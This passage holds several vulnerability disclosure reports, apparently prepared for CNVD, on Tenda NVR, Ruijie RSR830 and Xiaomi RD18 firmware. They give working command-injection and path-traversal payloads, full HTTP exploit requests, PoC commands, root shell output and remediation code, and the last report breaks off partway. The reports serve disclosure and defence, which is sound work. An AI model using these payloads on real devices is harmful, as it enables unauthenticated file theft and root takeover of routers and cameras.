4. Run the PoC with the default payload `x";id;echo PWNED_CNVD;#` as the PPPoE account name:

```
[IMPORT] system("sed -i \"/USER=.*/c USER='%s'\" %s")
[CMD-CONSTRUCTED] sed -i "/USER=.*/c USER='x";id;echo PWNED_CNVD;#'" /opt/sav/Config/ppp/pppoe.conf
[SHELL-OUTPUT] uid=0(root) gid=0(root) groups=0(root),1000(docker) | PWNED_CNVD
[SHELL-EXIT] rc=0
[FILE-WRITE] /opt/sav/Config/ppp/chap-secrets <<< "x";id;echo PWNED_CNVD;#" * ""
[VERDICT] SUCCESS - the firmware built an attacker-controlled shell command
[VERDICT] SUCCESS   injected command executed: uid=0(root) gid=0(root) ...
```

The `uid=0(root)` in the output is the real output of the injected `id` command, not a hard-coded string.

5. Control case with a single-quote payload `x';id;#`: the semicolon remains inside the unbroken double-quoted string, the shell does not split commands, verdict FAILED — confirming the double quote is the required escape character.

On a real device the equivalent action is: log in as administrator → Network Settings → WAN → PPPoE → enter `x";id;echo PWNED_CNVD;#` as the PPPoE account name → save; the injection executes as root when the configuration is applied or on the next re-dial.

## Evidence

![Firmware container unpacked: partition images listed, 0x40 private headers stripped, user-x and custom-x unsquashed](N6P16H_images/fig1.png)

![Firmware md5 and version file confirming SWVersion=V12.1.5.16, DeviceType=N6P, CustomerId=TDC01](N6P16H_images/fig2.png)

![Benign baseline run: constructed sed command with a normal account name, verdict FAILED](N6P16H_images/fig3.png)

![PoC run: injected id/echo commands executed as uid=0(root), payload persisted into chap-secrets and pap-secrets, verdict SUCCESS](N6P16H_images/fig4.png)

![Control case with single-quote payload: shell does not split commands, verdict FAILED, confirming the double-quote escape requirement](N6P16H_images/fig5.png)

## Impact

An authenticated attacker (or an attacker who can get a malicious account name stored, e.g. via a compromised lower-privileged session) can execute arbitrary commands as root on the NVR. Consequences include reading or modifying recorded video, writing persistent scripts under `/opt/sav`, enabling a telnet backdoor, altering network configuration, and full device takeover. Because the payload is persisted into `pppoe.conf`/`chap-secrets`/`pap-secrets`, the injected command re-executes on WAN re-connection or reboot, giving persistence.

## Remediation Suggestions

1. Root fix: remove the `system()` concatenation entirely. Write `pppoe.conf` the same way `chap-secrets`/`pap-secrets` are already written — open with `"w"`, scan line by line, replace lines starting with `USER` by a `USER <name>` line written as data (never as part of a command string). Preferably, use the vendor configuration library so `pppoe.conf` is generated by the configuration module and delete all manual file-editing logic.
2. If a command-line call must be kept short-term: wrap all external data in single quotes with inner-quote escaping (`'\''`), never use double quotes around variables; enforce a character whitelist on account/password (e.g. `^[A-Za-z0-9._@-]{1,64}$`) rejecting `" ' ; $ \ ( ) & | > <` and other shell metacharacters; re-check the total length and validate the assembled command before `system()`.
3. Defense in depth: run the business daemon as a dedicated unprivileged user instead of root, tighten `/opt/sav/Config/` permissions; audit all `system()` / `popen()` / `exec*` call sites in this firmware (e.g. the `echo %d > %s` pattern near `StopPPPoEConnect()` at 0x00011BB50); fix the unbounded `strcpy` calls at 0x00011BCC8 / 0x00011BCD4 with `snprintf` plus length checks.
4. Regression tests: fill PPPoE account names `x";id;#`, `$(id)`, `` `id` ``, `x';id;#` and a 1024-byte string, verify `pppoe.conf` content is correct with no extra command executed, and check that `chap-secrets` / `pap-secrets` contain no metacharacters that pppd could re-interpret.

## References

- Official firmware download: https://static.tenda.com.cn/tdcweb/download/uploadfile/N6P-16H/N6P-16H%20%E5%8D%87%E7%BA%A7%E8%BD%AF%E4%BB%B6.zip

## Discoverer

Vulnerability discovered by **JiuZero**.

title: Ruijie RSR830 RGOS 12.6(4)B1813: eweb CWMP Upload Arbitrary File Write (Unauthenticated, Root RCE)
content:
# Ruijie RSR830 RGOS 12.6(4)B1813: eweb CWMP Upload Arbitrary File Write (Unauthenticated, Root RCE)

## Vulnerability Type / CWE

- Arbitrary file write via path traversal (CWE-22), reachable without authentication (CWE-306)
- Because the eweb web management service runs with root privileges, the arbitrary write can be escalated to remote code execution (e.g. by writing `/etc/crontab` or Python modules loaded by the service)

## Affected Product

| Field | Value |
| --- | --- |
| Vendor | Ruijie Networks |
| Product | RSR830 series mobile router |
| Model | RSR830 |
| Firmware filename & version | RSR830_RELEASE_RGOS12.6(4)B1813_13211906_install.bin (RGOS 12.6(4)B1813, eweb internal version 1.31, build 20260919) |
| Severity | Critical |
| Component | eweb CWMP Upload interface — `inc/cwmp/CwmpController.py`, function `cwmpUpload()` |

Firmware SHA256: `d17c19e0b48f8f8eb1f32ef72c52de6821c05868b6bfdd3ab0766118890bb733`

## Vulnerability Description

The eweb web management service bundled in Ruijie RSR830 firmware RGOS 12.6(4)B1813 exposes a CWMP (CPE WAN Management Protocol) upload endpoint at:

```
POST /api/inc/cwmp/inform/ruijie_inc_acc_zcm/upload
```

The handler `cwmpUpload()` in `CwmpController.py` takes the file name from the attacker-controlled query parameter `file` and builds the destination path by plain string concatenation, without any canonicalization or `../` filtering. Combined with an authentication whitelist entry that is matched by substring, this allows an unauthenticated attacker to write arbitrary content to any writable location of the device filesystem using path traversal sequences such as `../../../../../../../etc/crontab`. Since eweb runs as root, this can be turned into remote code execution.

## Root Cause Analysis

Two defects combine:

1. Unrestricted path concatenation in the upload handler.
2. An overly broad authentication whitelist that makes the endpoint reachable pre-auth.

The endpoint is registered in `etc/web/eweb/eweb/inc/cwmp/CwmpController.py` (lines 99-111):

```python
@inc.route("/cwmp/inform/ruijie_inc_acc_zcm/upload", methods=['POST'])   # L99 unauthenticated entry
def cwmpUpload():                                                          # L100
    fileName = request.args.get("file")                                # L101 attacker-controlled (query param)
    type = request.args.get("type")                                    # L102
    file = request.files['file']                                       # L105 upload content
    path = ewebConfig.tmpFoldTmp + fileName                            # L106 plain concatenation, no filtering
    if file:
        if not os.path.exists(ewebConfig.tmpFoldTmp):
            os.makedirs(ewebConfig.tmpFoldTmp)
        with open(path, "xb") as destFile:                             # L109 arbitrary write
            file.save(destFile)                                        # L102 content written to disk
    return RestResponse.success(None)
```

The path prefix comes from `settings.py` line 8: `tmpFoldTmp = "/tmp/vsd/0/html/web/tmp/"`. Because `path = tmpFoldTmp + fileName` is a pure string concatenation, any `../` sequence inside `fileName` escapes the intended temp directory.

The authentication chain is bypassed as follows: `framework/intercept/Intercept.py` line 28 calls `WebAuthUtils.checkSecurity(request)`, which iterates over `apiWithePaths` in `framework/utils/WebAuthUtils.py`. Line 18 of that whitelist contains `/api/inc/cwmp/inform`, and the check is a substring match (`if p in request.path: return`), so any URL containing that substring — including the `/upload` endpoint above — skips token validation entirely.

## Exploitation

Preconditions:

- The target eweb management service is reachable over the network (firmware emulated with `qemu-arm-static` in this research; the service listens on port 8000 in the lab).
- No credentials are required.

Steps:

1. Extract the firmware (`RPM` package → `*.cpio` → `RSR830.bin` → gzip stream → `rootfs.sqsh` → squashfs-root) and confirm the version markers `version = "1.31"`, `build = "20260919"` in `etc/web/eweb/eweb/settings.py`.
2. Start the eweb service (`Running on http://127.0.0.1:8000/`).
3. Send a multipart POST request with a traversal path in the `file` query parameter (URL-encoded separators), 7 levels up from `/tmp/vsd/0/html/web/tmp/` reaches the filesystem root:

```http
POST /api/inc/cwmp/inform/ruijie_inc_acc_zcm/upload?file=..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpwned_cwmp_fdb29f51.txt&type=1 HTTP/1.1
Host: 127.0.0.1:8000
Content-Type: multipart/form-data; boundary=<boundary>

--<boundary>
Content-Disposition: form-data; name="file"; filename="poc.txt"
Content-Type: application/octet-stream

PWNED_CNVD_fdb29f51
--<boundary>--
```

4. The server responds `HTTP 200` with:

```json
{"message":"操作成功","result":null,"success":true,"timestamp":1793165541313}
```

5. The file lands outside the intended directory — in the emulation environment (no chroot) it was created directly in the host root filesystem: `/etc/pwned_cwmp_fdb29f51.txt` with content `PWNED_CNVD_fdb29f51`, confirmed by host-side listing:

```
-rw-r--r-- 1 root root 19 Oct 28 13:32 /etc/pwned_cwmp_0c81cebb.txt
-rw-r--r-- 1 root root 19 Oct 28 13:30 /etc/pwned_cwmp_fdb29f51.txt
```

## Evidence

![Firmware unpacking chain of RSR830_RELEASE_RGOS12.6(4)B1813_13211906_install.bin down to squashfs-root](RSR830_images/fig1.png)

![Emulated eweb service started on port 8000 and PoC returning HTTP 200 with VERDICT SUCCESS - arbitrary file write confirmed](RSR830_images/fig2.png)

- `fig1.png` — the automated firmware extraction chain producing `./squashfs-root`, confirming the analyzed rootfs matches the shipped firmware.
- `fig2.png` — the emulation boot (`Running on http://127.0.0.1:8000/`), the traversal upload (`file=..%2F..%2F...%2Fetc%2Fpwned_cwmp_...`) returning `HTTP 200` with `"success":true`, and the verdict `arbitrary file write confirmed`.

## Impact

An unauthenticated attacker with network access to the management interface can write arbitrary files anywhere the eweb service can write, as root. This directly enables:

- Overwriting system files such as `/etc/crontab` or service scripts to achieve root-level command execution.
- Planting or replacing Python modules loaded by the eweb Flask application for persistent code execution.
- Tampering with device configuration and rendering the device unstable or bricked.

## Remediation Suggestions

1. Canonicalize the file name before use — reject path separators and leading dots:

```python
fileName = os.path.basename(request.args.get('file'))  # keep the name only
if not fileName or fileName.startswith('.'):
    abort(400)
path = os.path.join(ewebConfig.tmpFoldTmp, fileName)
if not os.path.realpath(path).startswith(os.path.realpath(ewebConfig.tmpFoldTmp)):
    abort(403)
```

2. Tighten the authentication whitelist: change the `/api/inc/cwmp/inform` entry in `WebAuthUtils.py` from substring matching to exact matching, and add CWMP device-certificate or HMAC signature verification for the upload interface.
3. Least privilege: run eweb with reduced privileges, restrict write permissions of the upload directory, and isolate the service with chroot.

## References

- Official firmware download: https://www.ruijie.com.cn/fw/rj/292075/

## Discoverer

Vulnerability discovered by **JiuZero**.

title: Ruijie RSR830 RGOS 12.6(4)B1813: eweb CwmpController Download Interface Unauthenticated File Read (Pre-Auth, Sensitive File Disclosure)
content:
# Ruijie RSR830 RGOS 12.6(4)B1813: eweb CwmpController Download Interface Unauthenticated File Read (Pre-Auth, Sensitive File Disclosure)

## Vulnerability Type / CWE

- **CWE-862**: Missing Authorization (authentication bypass via substring whitelist matching), combined with a restricted form of **CWE-22** (Path Traversal — unvalidated `fileName` concatenation)
- Vulnerability type: Unauthenticated file read (arbitrary file read within the TFTP drop directory)
- Severity: High

## Affected Product

| Item | Value |
| --- | --- |
| Vendor | Ruijie Networks (锐捷网络) |
| Product | RSR830 (RG-RSR830 series mobile router) |
| Model | RSR830 |
| Firmware filename & version | `RSR830_RELEASE_RGOS12.6(4)B1813_13211906_install.bin` — RGOS 12.6(4)B1813, eweb internal version 1.31, build 20260919 (SHA-256 `d17c19e0b48f8f8eb1f32ef72c52de6821c05868b6bfdd3ab0766118890bb733`) |
| Severity | High |
| Component | `./squashfs-root/etc/web/eweb/eweb/inc/cwmp/CwmpController.py` — `cwmpUpgradeDownload()`; interface `GET /api/inc/cwmp/inform/ruijie_inc_acc_zcm/download/<fileName>` |

The firmware is nested-packaged: `install.bin` (RPM v3.0) → `*.cpio` → `RSR830.bin` (inner RPM) → `*.cpio` → `rootfs.sqsh` (SquashFS). CPU architecture is ARM 32-bit little-endian. The eweb management service is a Python/Flask application (`/bin/python3.4 manage.py`).

## Vulnerability Description

In the eweb web management service of the Ruijie RSR830 firmware RGOS 12.6(4)B1813, the CWMP download interface allows unauthenticated file reading.

`CwmpController.py`'s `cwmpUpgradeDownload()` (lines 116-122) handles `GET /api/inc/cwmp/inform/ruijie_inc_acc_zcm/download/<fileName>`. The function builds the file path by directly concatenating `TftpConfig.tftpPath + fileName` and returns the file contents via `send_file()` — with **no authentication** and **no normalization or validation of `fileName`**.

The interface path hits the `/api/inc/cwmp/inform` entry (line 18) in the `WebAuthUtils.apiWithePaths` whitelist, and `checkSecurity()` uses a substring match — `if p in request.path: return` (lines 112-114) — to skip token validation, so the interface is reachable with no credentials at all. An attacker can therefore read any file under `TftpConfig.tftpPath` (i.e. `/tmp/vsd/0/html/web/tftp/`) unauthenticated. That directory is the drop point for device firmware backups, configuration backups, logs, and other sensitive files; a leak directly endangers device credentials and network topology.

## Root Cause Analysis

**Vulnerable handler.** `./squashfs-root/etc/web/eweb/eweb/inc/cwmp/CwmpController.py`, lines 116-122:

```python
@inc.route("/cwmp/inform/ruijie_inc_acc_zcm/download/<fileName>", methods=['GET'])  # L116
def cwmpUpgradeDownload(fileName):                                                  # L117
    abPath = TftpConfig.tftpPath + fileName                                         # L118 direct concatenation, no validation
    if os.path.exists(abPath):
        return send_file(abPath, as_attachment=True)                                # L120 unauthenticated, returned as-is
    else:
        abort(404)                                                                  # L122
```

Line 118 is a plain string concatenation — no `os.path.basename`, no `realpath`, no directory-boundary check. Lines 119-122 only test file existence and return the file verbatim.

**Read directory configuration.** `./squashfs-root/etc/web/eweb/eweb/settings.py`:

```python
class TftpConfig:
    tftpPath = "/tmp/vsd/0/html/web/tftp/"   # note: TftpConfig.tftpPath, not ewebConfig.tftpFold
```

**Authentication whitelist (bypass root cause).** `./squashfs-root/etc/web/eweb/eweb/framework/utils/WebAuthUtils.py`:

- Line 18: `"/api/inc/cwmp/inform"` — the whitelist entry covers the entire `inform` subtree, including this download interface.
- Lines 112-114: `checkSecurity()` performs substring matching — `for p in apiWithePaths: if p in request.path: return` — skipping token validation whenever the request path merely *contains* a whitelist entry.

The combination (whitelisted subtree + substring match + unvalidated `fileName`) yields a fully unauthenticated read of every file the device drops into the TFTP directory. In testing, a directory-traversal probe `../../../../../etc/passwd` returned HTTP 200 but the body was an internal-error JSON (`"'NoneType' object has no attribute 'rule'"`) — `/etc/passwd` was **not** disclosed, so the read is bounded to the `tftpPath` directory tree; the impact is theft of whatever sensitive files land there (firmware/config backups, logs).

## Exploitation

### Preconditions

- Network reachability of the eweb management service. No credentials of any kind are required — the interface sits in the anonymous whitelist.

### Steps (emulation verification)

1. Prepare a working directory on a WSL-native ext4 filesystem (the package notes that unpacking on `/mnt/c` DrvFS mounts is both ~0.5 MB/s slow and prone to silently corrupted cpio extraction), copy the delivery package in, and verify the firmware hash:

```sh
sha256sum ./RSR830_RELEASE_RGOS12.6\(4\)B1813_13211906_install.bin
# d17c19e0b48f8f8eb1f32ef72c52de6821c05868b6bfdd3ab0766118890bb733
```

2. Unpack the nested firmware and confirm versions:

```sh
bash ./extract_firmware.sh
cat ./squashfs-root/etc/web/eweb/eweb/settings.py | grep -E 'version|build'
# version = "1.31"   build = "20260919"
```

3. Start the emulated eweb Flask service under `qemu-arm-static` (a shim, `emul_eweb_shim.py`, stubs the license daemon and CLI backend dependencies that would otherwise block startup):

```sh
bash ./run_emulation.sh
# INFO:werkzeug: * Running on http://127.0.0.1:8000/
```

4. Place a marked test file in the TFTP drop directory (guest path `/tmp/vsd/0/html/web/tftp/`, mapped by `qemu -L` to `./squashfs-root/tmp/vsd/0/html/web/tftp/`):

```sh
mkdir -p ./squashfs-root/tmp/vsd/0/html/web/tftp
printf 'SECRET_TFTP_BACKUP_DATA_12345\n' > ./squashfs-root/tmp/vsd/0/html/web/tftp/poc_read.txt
```

5. Run the unauthenticated-read PoC:

```sh
python3 ./poc_cwmp_file_read.py http://127.0.0.1:8000 poc_read.txt
```

### HTTP request

```http
GET /api/inc/cwmp/inform/ruijie_inc_acc_zcm/download/poc_read.txt HTTP/1.1
Host: <router>:8000

(no Authorization header, no session cookie)
```

### Expected output

```text
[*] GET download/poc_read.txt -> HTTP 200, 30 bytes
[*] content head: b'SECRET_TFTP_BACKUP_DATA_12345\n'
[*] VERDICT SUCCESS - unauthenticated file read confirmed
```

Repeating the request with a forged `Authorization: Bearer faketoken` header still returns HTTP 200 — proving the bypass comes from the whitelist substring match rather than chance. A traversal probe `../../../../../etc/passwd` returns HTTP 200 with an internal-error JSON body (no `/etc/passwd` content), and a missing file returns 404 as expected.

On a real device the same request is sent to the management service port (the package's forensic script targets `https://180.158.32.14:4430`), so any host that can reach the management IP can read the files the device deposits in its TFTP directory.

## Evidence

![extract_firmware.sh: nested firmware unpacking (outer RPM, cpio layers, inner RSR830.bin, rootfs.sqsh), firmware version extraction showing RSR830_RGOS v1.0, eweb settings.py version 1.31 / build 20260919, and build-info blocks](RRSR830_images/fig1.png)

Firmware asset extraction: the nested packaging (install.bin RPM v3.0 → cpio → RSR830.bin → cpio → rootfs.sqsh, 130 MB) is unwound to `squashfs-root`; the extracted `settings.py` confirms eweb version 1.31 / build 20260919, and the build-info blocks identify the target as `RSR830_RGOS` v1.0 with its git SHAs and build dates.

![run_emulation.sh boot and PoC: eweb started on 127.0.0.1:8000 under qemu-arm-static, test file dropped into tftp dir, unauthenticated GET returns HTTP 200 with SECRET_TFTP_BACKUP_DATA_12345, VERDICT SUCCESS](RRSR830_images/fig2.png)

Live verification: the emulated eweb service reports `Running on http://127.0.0.1:8000/`; the marker file is placed in the TFTP drop directory; the unauthenticated `GET .../download/poc_read.txt` returns HTTP 200 with the file contents `SECRET_TFTP_BACKUP_DATA_12345` and the harness prints `VERDICT SUCCESS - unauthenticated file read confirmed`.

## Impact

- Any unauthenticated attacker with network access to the management service can read **every file the device deposits in `/tmp/vsd/0/html/web/tftp/`** — the drop point for firmware backups, configuration backups, and logs.
- Configuration backups typically contain administrator credentials, SNMP communities, WAN/PPP credentials, and network topology — enabling full device and network compromise.
- The read is bounded to the `tftpPath` tree in this firmware version (traversal to `/etc/passwd` failed in testing), but the same missing-authorization defect applies to the whole `/api/inc/cwmp/inform` subtree, and the `fileName` remains unsanitized — any future change that makes absolute-path reads succeed would turn this into a full arbitrary-file-read.

## Remediation Suggestions

1. **Tighten the authentication whitelist (root cause one).** The `"/api/inc/cwmp/inform"` entry in `WebAuthUtils.apiWithePaths` is a substring whitelist that silently authorizes the whole `inform` subtree, including this download interface. Replace substring matching with exact prefix/exact-path matching to avoid over-authorization, and add device-identity verification (e.g. a CWMP certificate or signed token) to the download interface instead of placing it in an anonymous whitelist.
2. **Normalize the filename and enforce directory boundaries (root cause two).** In `cwmpUpgradeDownload()`, normalize `fileName` and verify the resolved absolute path stays inside `tftpPath`:

```python
import os
fileName = os.path.basename(fileName)                       # strip any path components
abPath = os.path.join(TftpConfig.tftpPath, fileName)
tftpRoot = os.path.realpath(TftpConfig.tftpPath)
if not os.path.realpath(abPath).startswith(tftpRoot + os.sep):
    abort(403)
if not os.path.isfile(abPath):
    abort(404)
return send_file(abPath, as_attachment=True)
```

3. **Least-privilege drop directory.** Restrict `tftpPath` to files that genuinely need to be downloadable, and whitelist downloadable file types/sources to reduce the value of sensitive files landing there.

## References

- Firmware download (as referenced in the audit package): <https://www.ruijie.com.cn/fw/rj/292075/>

## Discoverer

Vulnerability discovered by **JiuZero**.

title: Xiaomi MiWiFi RD18 1.0.91: xqsmarthome.lua guest_tunnelSmartControllerRequest OS Command Injection (Authenticated, Root RCE)
content:
# Xiaomi MiWiFi RD18 1.0.91: xqsmarthome.lua guest_tunnelSmartControllerRequest OS Command Injection (Authenticated, Root RCE)

## Vulnerability Type / CWE

- **CWE-78**: Improper Neutralization of Special Elements used in an OS Command ("OS Command Injection") — quote-breakout in a single-quoted `string.format` shell template
- Vulnerability type: OS command injection in the smart-home tunnel controller interface
- Severity: Critical (authenticated root command execution)

## Affected Product

| Item | Value |
| --- | --- |
| Vendor | Xiaomi |
| Product | Xiaomi MiWiFi RD18 router |
| Model | MiWiFi RD18 (hardware platform RD18; the firmware's `xiaoqiang_version` self-reports `option HARDWARE 'RD18'` and no "BE5000" string appears anywhere in the image, so RD18 is used as the authoritative device identifier) |
| Firmware filename & version | `miwifi_rd18_firmware_05f43_1.0.91.bin` — ROM 1.0.91, Linux kernel 5.4.55, build `commit b38be1829bd838bfc75d85edbe16e928a62afa89`, build time `Fri, 15 Aug 2025 03:42:08 +0000` (SHA-256 `27968aaa3efa56e7a90a6ef7da7a51f392f612d49b1948d5de20a9304f3e417b`, MD5 `bc8494273be71cc2924b53175a505f43`, 30152712 bytes) |
| Severity | Critical |
| Component | LuCI controller `/usr/lib/lua/luci/controller/api/xqsmarthome.lua` — `guest_tunnelSmartControllerRequest()`, via the constant `THRIFT_TUNNEL_TO_SMARTHOME_CONTROLLER` in `/usr/lib/lua/xiaoqiang/common/XQConfigs.lua`; sink `os.execute("thrifttunnel 2 '%s'")` |

The root filesystem is SquashFS 4.0 (xz, offset 0x341004 / 3411972, 5457 inodes). All web logic is shipped as Fate/Z-compiled Lua bytecode (chunk signature `1b "Fate/Z"`), with no plaintext source; analysis below is based on the decoded constant tables of the relevant chunks plus direct execution of the real bytecode under QEMU.

## Vulnerability Description

The MiWiFi web management interface is built on LuCI with Lua controller modules: handlers read parameters and pass them to helper functions in `xiaoqiang.common.XQConfigs`, which assemble shell command lines and hand them to `os.execute()` / `io.popen()`.

In `/usr/lib/lua/luci/controller/api/xqsmarthome.lua`, the smart-home controller `guest_tunnelSmartControllerRequest()` receives the tunnel payload as a function argument (in this firmware the handler takes the payload directly as a parameter rather than reading it via `luci.http.formvalue`) and passes it to `XQConfigs.exec()` keyed by the constant:

```lua
THRIFT_TUNNEL_TO_SMARTHOME_CONTROLLER = "thrifttunnel 2 '%s'"
```

The `%s` is replaced with the attacker-controlled value and the resulting string is executed by the shell. The firmware performs **no shell quoting and no escaping** on this value.

Because the value sits inside single quotes, a common misjudgment is that it is safe — single quotes do neutralize `;`, `|`, `&`, `>`. But that holds only while the payload itself contains no single quote. A single `'` in the payload terminates the quoted string early; everything after it is parsed by `/bin/sh` as ordinary shell syntax, including `$( )` command substitution. With the payload

```text
x'$(id > .poc_work/CNVD_PWNED)';#
```

the final command line becomes

```sh
thrifttunnel 2 'x'$(id > .poc_work/CNVD_PWNED)';#'
```

The trailing `;#` re-opens a quote so the line stays syntactically balanced, and the final `#` comments out the closing quote that the format string itself appends. When `/bin/sh` parses this line it expands the command substitution and executes `id` as root, writing the result to the target path — all before the shell ever looks for the `thrifttunnel` binary (whose absence is irrelevant: the injected command has already run).

This is not a theoretical quoting flaw: running the firmware's real bytecode showed the injected command executing and returning `uid=0(root) gid=0(root) groups=0(root)`.

Notably, the firmware **does contain an escaping helper**: the adjacent sink `_setMacFilter` in `xqsystem.lua` uses it correctly. This vulnerability is therefore "existing protection not applied", not "no protection exists at all". Six further unescaped `%s` templates in `XQConfigs.lua` share the same defect (see Root Cause Analysis).

**Attack scenario.** Any principal that can reach the authenticated management interface — a logged-in administrator, an attacker holding a stolen `adminAuth`/session cookie, or one who has compromised the interface via an authentication bypass or CSRF — obtains arbitrary root command execution on the router. With root, the attacker can read stored Wi-Fi passwords and router configuration, exfiltrate WAN credentials, alter DNS and forwarding rules, plant persistent backdoors, or brick the device.

## Root Cause Analysis

**Request handler.** `/usr/lib/lua/luci/controller/api/xqsmarthome.lua` exports `guest_tunnelSmartControllerRequest`. Its constant table contains:

```text
const @ 0x1d0  "guest_tunnelSmartControllerRequest"
const @ 0xc64  "THRIFT_TUNNEL_TO_SMARTHOME_CONTROLLER"
const @ 0xd27  "THRIFT_TUNNEL_TO_SMARTHOME_CONTROLLER"
```

along with `require`, `luci.http`, `xiaoqiang.common.XQConfigs`, `xiaoqiang.common.XQFunction`, `binaryBase64Enc`, `luci.util`, `write`, `exec`, confirming the call path. The handler passes the transport-encoded payload to `XQConfigs.exec()`.

Route registration places the node under the admin realm:

```text
node("api") -> target("xqsmarthome") -> firstchild()
    -> sysauth("admin") / sysauth_authenticator("jsonauth")
```

Despite the `guest_` prefix (the guest/unauthenticated query variant of the tunnel request), the node still carries `sysauth("admin")`, so exploitation requires an administrator session.

**Command sink.** `/usr/lib/lua/xiaoqiang/common/XQConfigs.lua` holds the command template:

```text
const @ 0x312e  "THRIFT_TUNNEL_TO_SMARTHOME_CONTROLLER"
const @ 0x3159  "thrifttunnel 2 '%s'"
```

The effective behavior of `XQConfigs.exec()` is:

```lua
os.execute(string.format(THRIFT_TUNNEL_TO_SMARTHOME_CONTROLLER, payload))
```

Complete data flow:

```text
HTTP request  payload=<attacker-controlled>
  -> LuCI dispatch forwards payload as a function argument to guest_tunnelSmartControllerRequest(payload)
  -> base64/url transport encoding (transport only, not protection)
  -> XQConfigs.exec(THRIFT_TUNNEL_TO_SMARTHOME_CONTROLLER, payload)
  -> string.format("thrifttunnel 2 '%s'", payload)     <-- unescaped substitution
  -> os.execute / io.popen("thrifttunnel 2 '" .. payload .. "'")   <-- shell parses the string
```

No validation, whitelist, or escaping exists anywhere on the path. The single quotes in the format string are the only barrier between the payload and the shell parser, and one quote inside the payload breaks through.

**Six sibling templates share the flaw** (same file, same `exec()` helper): `thrifttunnel 0 '%s'` (offset 0x30dc), `thrifttunnel 1 '%s'` (0x3115), `thrifttunnel 6 '%s'` (0x3232), `thrifttunnel 7 '%s'` (0x3269), `thrifttunnel 8 '%s'` (0x32a4), and `/opt/filetunnel/tunneltool --payload '%s'` (0x32ce).

**The protection that already exists.** `_setMacFilter` in `/usr/lib/lua/luci/controller/api/xqsmarthome.lua` (constant `"/usr/sbin/crontab_rom.sh '%s' '%s' '%s'"` at 0xaa1d, and `ubus send trafficd "{\"mac\":\"<mac>\",\"api\":1,\"wan\":\"0\"}"`) does pass the `mac` value through the firmware's escaping helper first. Executing the real handler under QEMU and dumping the constructed command byte-by-byte measured the helper as:

| Input | Value reaching the shell |
| --- | --- |
| `a'b` | `a\'b` |
| `a"b` | `a\"b` |
| ``a`b`` | ``a\`b`` |
| `a$b` | `a\$b` |
| `a\b` | `a\\b` |

Since `$` and backticks are neutralized there, command substitution cannot reach that sink, and `_setMacFilter` is excluded from this report after testing. The contrast pinpoints the defect in the tunnel path: the protection exists in the codebase but was simply not applied at this call site.

**Why conventional payloads fail and which one works.** Inside single quotes, the usual separators are inert: `a;id`, `a|id`, `a&b`, `a>b` all remain literal text (the shell only reports `ubus`/`thrifttunnel` not found). Tested payload forms:

| Payload | Generated command | Result |
| --- | --- | --- |
| `x'$(id > M)'` | `thrifttunnel 2 'x'$(id > M)''` | Fails — unbalanced quotes (`Syntax error: Unterminated quoted string`) |
| `x'$(id > M)' ;` | `thrifttunnel 2 'x'$(id > M)' ;'` | Works |
| `x'$(id > M)';#` | `thrifttunnel 2 'x'$(id > M)';#'` | Works — form adopted by the PoC |

The PoC uses the `;#` form because the trailing `#` comments out the format string's own closing quote, leaving the shell no syntactic residue.

## Exploitation

### Preconditions

- An authenticated administrator session (`sysauth("admin")` protects the route) — a valid admin login, a stolen `adminAuth`/session cookie, or a compromised/bypassed session.
- Reachability of the `/api/xqsmarthome` tunnel controller endpoint.

### Steps (emulation verification, per `poc.sh`)

1. Verify firmware hashes: `sha256sum` → `27968aaa...417b`, `md5sum` → `bc849427...5f43`.
2. Unpack the root filesystem (before starting any target): binwalk locates the SquashFS partition at offset 3411972; `tail -c +3411973 ... > .poc_work/rootfs.sqfs` carves it; `unsquashfs -d .poc_work/extracted .poc_work/rootfs.sqfs` extracts it.
3. Show the version as asset proof: `cat .poc_work/extracted/usr/share/xiaoqiang/xiaoqiang_version` prints `option ROM '1.0.91'`, `option HARDWARE 'RD18'`, `option LINUX '5.4.55'`.
4. Start the target — the firmware's own Lua interpreter under QEMU user-mode emulation (the web service itself need not run; the vulnerable code is the Lua bytecode distributed inside the image):

```sh
file .poc_work/extracted/usr/bin/lua        # ELF 32-bit LSB pie executable, ARM, EABI5
qemu-arm-static -L .poc_work/extracted \
    .poc_work/extracted/usr/bin/lua .poc_work/poc.lua .poc_work/CNVD_PWNED
```

5. Trigger: `poc.sh` calls the real `guest_tunnelSmartControllerRequest()` with the payload as the function argument (`pcall(mod.guest_tunnelSmartControllerRequest, PAYLOAD)`; this firmware's handler reads the payload from its argument, not from `formvalue`). It first swaps `io.popen`/`os.execute` for loggers to print the firmware-constructed command (`[CMD-CONSTRUCTED]`), then restores the real sink and executes it (`[IMPORT]`), and finally checks for the output file.

### Payload

```lua
local PAYLOAD = "x'$(id > " .. MARKER .. ")';#"
-- MARKER = .poc_work/CNVD_PWNED
```

### Observed output

```text
=== [4/4] Running the PoC against the real firmware code ===
  [VULN] component=luci.controller.api.xqsmarthome handler=guest_tunnelSmartControllerRequest param=payload
  sh: 1: thrifttunnel: not found
  [CMD-CONSTRUCTED] thrifttunnel 2 'x'$(id > .poc_work/CNVD_PWNED)';#'
  [IMPORT] io.popen(thrifttunnel 2 'x'$(id > .poc_work/CNVD_PWNED)';#')

=== Result ===
VERDICT SUCCESS - injected command executed as root:
  uid=0(root) gid=0(root) groups=0(root),1000(docker)
```

The `thrifttunnel: not found` line only reflects the tunnel helper binary being absent from the audit sandbox — `/bin/sh` completes the command substitution while parsing the line, so the injected command runs before the missing binary is ever searched. The file written by the injected command plus the `uid=0(root)` line are the evidence of execution.

On a real device, the equivalent exploit is an authenticated request to the tunnel controller endpoint with a payload carrying the same `x'$(...)';#` structure in the tunnel payload field.

## Evidence

![poc.sh full run: firmware SHA-256/MD5 verification, squashfs unpack at offset 3411972, xiaoqiang_version showing ROM 1.0.91 / HARDWARE RD18 / LINUX 5.4.55, PoC run against the real firmware code with CMD-CONSTRUCTED command and VERDICT SUCCESS uid=0(root)](MiRD18_images/fig1.png)

End-to-end verification transcript: the firmware hashes are verified, the SquashFS rootfs is carved at offset 3411972 and unpacked, the version block confirms ROM 1.0.91 on hardware RD18, and the PoC drives the real `guest_tunnelSmartControllerRequest` handler — the `[CMD-CONSTRUCTED]` line shows the exact string the firmware built (`thrifttunnel 2 'x'$(id > .poc_work/CNVD_PWNED)';#'`), the `[IMPORT]` line shows it reaching `io.popen`, and the final verdict reports the injected command executed as root: `uid=0(root) gid=0(root) groups=0(root),1000(docker)`.

